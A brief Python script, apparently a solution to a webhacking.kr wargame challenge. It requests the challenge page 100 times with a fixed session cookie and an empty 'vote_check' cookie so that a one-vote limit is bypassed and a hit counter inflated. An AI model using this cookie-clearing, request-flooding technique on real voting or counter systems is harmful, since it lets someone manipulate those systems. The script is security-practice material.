from requests import *
url='https://webhacking.kr/challenge/code-5/?hit=dnjrpdla12'
cookies={'PHPSESSID':'far26bcar827daho2udovd024p','vote_check':''}
for i in range(100):
    response=get(url=url,cookies=cookies)
    print(response.text)